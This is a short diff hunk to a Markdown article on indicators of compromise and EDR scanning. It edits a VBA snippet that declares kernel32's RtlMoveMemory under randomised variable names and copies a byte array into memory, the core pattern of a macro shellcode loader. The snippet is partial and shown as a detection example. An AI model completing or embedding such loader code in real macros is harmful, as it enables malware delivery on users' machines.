@@ -39,7 +39,7 @@ This pattern is a well-known indicator of compromise (IOC). EDRs often scan for 
 
 ```vbs
 Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal Krldhufs As LongPtr, ByRef Gsvspq As Any, ByVal Djjdc As Long) As LongPtr
-...
+
 For Rxsqoxe = LBound(Kqrfipip) To UBound(Kqrfipip)
     Tpjln = Kqrfipip(Rxsqoxe)
     Gczn = RtlMoveMemory(Clsghvido + Rxsqoxe, Tpjln, 1)
